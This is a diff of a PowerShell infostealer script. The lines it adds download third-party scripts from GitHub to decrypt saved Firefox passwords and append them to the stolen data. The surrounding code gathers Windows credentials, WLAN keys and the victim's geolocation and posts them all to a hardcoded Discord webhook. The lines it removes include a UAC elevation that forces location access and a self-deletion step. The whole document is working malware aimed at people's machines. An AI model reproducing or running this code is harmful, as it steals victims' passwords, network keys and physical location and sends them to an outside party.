@@ -1,4 +1,13 @@
+try {
+    Import-Module -Name CredentialManager
+}catch {
+    Write-Host "Missing Module..."
+}
+
+
 $webHookUrl = "https://discord.com/api/webhooks/873647888645898241/VCtL2QCQmdXnKceEYRQrApF9HNKmn8JLTCYjlYYu33pI5bfKRjb95Y0Cp20B85qatyc6"
+
+
 
 function IsInstalled($appName){
     $AppToCheck = '`'+$appName+'*'
@@ -23,14 +32,30 @@ function getlc {
 
     if ($GeoWatcher.Permission -eq 'Denied'){ # If Access Dineid
         Write-Host "Access Denied for Location Information" -ForegroundColor "red"
-        Write-Host "Try to set HKEY value..." -ForegroundColor "yellow"
-        # Command bellow is executed as admin
-        Start-Process powershell -Verb runAs "set-itemproperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location' -Name 'Value' -Value 'Allow'"
-        Start-Sleep -Seconds 3 #Wait for UAC.
-        getlc # Retry function
     } else {
         return $GeoWatcher.Position.Location | Select-Object Latitude,Longitude #Select the relevent results.
     }
+}
+
+
+function Get-FireFoxCred {
+    Invoke-WebRequest "https://raw.githubusercontent.com/techchrism/firefox-password-decrypt/master/Find-FirefoxFiles.ps1" -OutFile "$env:USERPROFILE\firefoxer01.ps1"
+    Invoke-WebRequest "https://raw.githubusercontent.com/techchrism/firefox-password-decrypt/master/ConvertFrom-NSS.ps1" -OutFile "$env:USERPROFILE\firefoxer02.ps1"
+    Invoke-WebRequest "https://raw.githubusercontent.com/techchrism/firefox-password-decrypt/master/Get-FirefoxPasswords.ps1" -OutFile "$env:USERPROFILE\firefoxer03.ps1"
+
+    Set-Location $env:USERPROFILE
+
+    . .\firefoxer01.ps1
+    . .\firefoxer02.ps1
+    . .\firefoxer03.ps1
+
+    $FireFoxCred = Get-FirefoxPasswords | Select-Object username, password, hostname
+
+    Remove-Item firefoxer01.ps1
+    Remove-Item firefoxer02.ps1
+    Remove-Item firefoxer03.ps1
+
+    return $FireFoxCred
 }
 
 
@@ -94,6 +119,18 @@ foreach ($cred in $WCred) {
     $Body.content += "$Username"+":"+"$Password`n"
 }
 
+
+$Body.content += "```````n:fox:  **FireFox Credentials**``````"
+
+# Getting FireFox Credentials
+$FCreds = Get-FireFoxCred
+foreach ($cred in $FCreds){
+    $username = $cred.username
+    $password = $cred.password
+    $url = $cred.hostname
+    $Body.content += "$username"+":"+"$password"+" ($url)`n"
+}
+
 # Getting WLAN Keys
 $Body.content += "```````n:key:  **WLAN Keys**``````"
 foreach ($wlan in $WLAN_Keys){
@@ -111,6 +148,8 @@ $Body.content += "Latitude  : $Latitude`n"
 $Body.content += "Longitude : $Longitude``````"
 $Body.content += "https://www.google.com/maps/place/$Latitude,$Longitude`n"
 
+
+# Send body through WebHook
 Invoke-RestMethod -Uri $webHookUrl -Method 'post' -Body $Body
 
 
@@ -128,7 +167,3 @@ if (IsInstalled -appName "Discord"){
         Remove-Item $filename
     }
 }
-
-
-# Self destruction
-Remove-Item -Path $MyInvocation.MyCommand.Source
